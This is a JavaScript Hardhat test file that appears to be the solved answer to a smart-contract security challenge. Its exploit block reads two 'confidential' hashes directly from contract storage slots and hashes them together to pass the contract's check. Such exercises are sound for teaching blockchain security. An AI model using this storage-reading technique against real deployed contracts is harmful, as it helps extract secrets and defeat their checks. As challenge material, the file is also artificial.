const {time, loadFixture,} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("Confidential", function () {

  let deployer, attacker, myHash;

  before(async function (){
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const ConfidentialFactory = await ethers.getContractFactory("Confidential");
    this.Confidential = await ConfidentialFactory.deploy();

  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    
    alice_hash_slotId = 4
    let alice_hash = await hre.ethers.provider.getStorageAt(this.Confidential.address, alice_hash_slotId)
    // console.log(`alice: Slot ${alice_hash_slotId} : ${alice_hash}`);

    bob_hash_slotId = 9
    let bob_hash = await hre.ethers.provider.getStorageAt(this.Confidential.address, bob_hash_slotId)
    // console.log(`bob: Slot ${bob_hash_slotId} : ${bob_hash}`);

    myhash = await this.Confidential.hash(alice_hash,bob_hash)

  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // check Hash
    expect(await this.Confidential.checkthehash(myhash)).to.be.equal(true);        
  });

});
